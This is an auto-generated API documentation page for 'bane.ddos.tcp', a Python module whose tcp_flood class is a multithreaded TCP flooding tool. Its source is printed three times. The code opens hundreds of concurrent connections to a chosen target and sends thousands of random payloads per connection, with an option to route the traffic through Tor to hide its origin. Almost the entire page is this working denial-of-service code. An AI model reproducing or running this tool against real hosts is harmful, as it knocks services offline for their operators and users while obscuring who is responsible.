<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.tcp</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class tcp_flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        min_size=10,
        max_size=50,
        threads=256,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.min_size = min_size
        self.max_size = max_size
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)  # give time for all threads to be created
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout = (
                            self.timeout
                        )  # we can&#39;t set timeout with socks module if we are going to use a socks proxy
                    if self.tor == True:
                        s.setproxy(
                            socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True
                        )  # let the traffic go through tor
                    s.connect((self.target, self.port))  # connect to target
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(
                            s, ssl_version=ssl.PROTOCOL_TLSv1
                        )  # use ssl if needed on specific ports
                    for l in range(
                        random.randint(self.round_min, self.round_max)
                    ):  # send packets with random number of times for each connection (number between &#34;round_min&#34; and &#34;round_max&#34;)
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if stop == True:
                            break
                        m = &#34;&#34;
                        for li in range(
                            random.randint(self.min_size, self.max_size)
                        ):  # each payload&#39; size is chosen randomly between maximum and minimum values
                            m += random.choice(lis)
                        try:
                            if stop == True:
                                break
                            s.send(m.encode(&#34;utf-8&#34;))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\rPackets: {} | Bytes: {}   &#34;.format(
                                        self.counter, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print(&#34;Packets: {} | Bytes: {}&#34;.format(tcp_counter,len(m)))
                            time.sleep(self.interval)
                        except:
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.tcp.tcp_flood"><code class="flex name class">
<span>class <span class="ident">tcp_flood</span></span>
<span>(</span><span>u, p=80, threads_daemon=True, min_size=10, max_size=50, threads=256, timeout=5, round_min=1000, round_max=10000, interval=0.001, duration=60, logs=False, tor=False)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class tcp_flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        min_size=10,
        max_size=50,
        threads=256,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.min_size = min_size
        self.max_size = max_size
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)  # give time for all threads to be created
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout = (
                            self.timeout
                        )  # we can&#39;t set timeout with socks module if we are going to use a socks proxy
                    if self.tor == True:
                        s.setproxy(
                            socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True
                        )  # let the traffic go through tor
                    s.connect((self.target, self.port))  # connect to target
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(
                            s, ssl_version=ssl.PROTOCOL_TLSv1
                        )  # use ssl if needed on specific ports
                    for l in range(
                        random.randint(self.round_min, self.round_max)
                    ):  # send packets with random number of times for each connection (number between &#34;round_min&#34; and &#34;round_max&#34;)
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if stop == True:
                            break
                        m = &#34;&#34;
                        for li in range(
                            random.randint(self.min_size, self.max_size)
                        ):  # each payload&#39; size is chosen randomly between maximum and minimum values
                            m += random.choice(lis)
                        try:
                            if stop == True:
                                break
                            s.send(m.encode(&#34;utf-8&#34;))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\rPackets: {} | Bytes: {}   &#34;.format(
                                        self.counter, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print(&#34;Packets: {} | Bytes: {}&#34;.format(tcp_counter,len(m)))
                            time.sleep(self.interval)
                        except:
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.tcp.tcp_flood.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)  # give time for all threads to be created
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                if self.tor == False:
                    s.settimeout = (
                        self.timeout
                    )  # we can&#39;t set timeout with socks module if we are going to use a socks proxy
                if self.tor == True:
                    s.setproxy(
                        socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True
                    )  # let the traffic go through tor
                s.connect((self.target, self.port))  # connect to target
                if (self.port == 443) or (self.port == 8443):
                    s = ssl.wrap_socket(
                        s, ssl_version=ssl.PROTOCOL_TLSv1
                    )  # use ssl if needed on specific ports
                for l in range(
                    random.randint(self.round_min, self.round_max)
                ):  # send packets with random number of times for each connection (number between &#34;round_min&#34; and &#34;round_max&#34;)
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if stop == True:
                        break
                    m = &#34;&#34;
                    for li in range(
                        random.randint(self.min_size, self.max_size)
                    ):  # each payload&#39; size is chosen randomly between maximum and minimum values
                        m += random.choice(lis)
                    try:
                        if stop == True:
                            break
                        s.send(m.encode(&#34;utf-8&#34;))
                        self.counter += 1
                        if self.logs == True:
                            sys.stdout.write(
                                &#34;\rPackets: {} | Bytes: {}   &#34;.format(
                                    self.counter, len(m)
                                )
                            )
                            sys.stdout.flush()
                            # print(&#34;Packets: {} | Bytes: {}&#34;.format(tcp_counter,len(m)))
                        time.sleep(self.interval)
                    except:
                        break
                    time.sleep(self.interval)
                s.close()
            except:
                pass
            time.sleep(0.1)
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.tcp.tcp_flood" href="#bane.ddos.tcp.tcp_flood">tcp_flood</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.tcp.tcp_flood.attack" href="#bane.ddos.tcp.tcp_flood.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>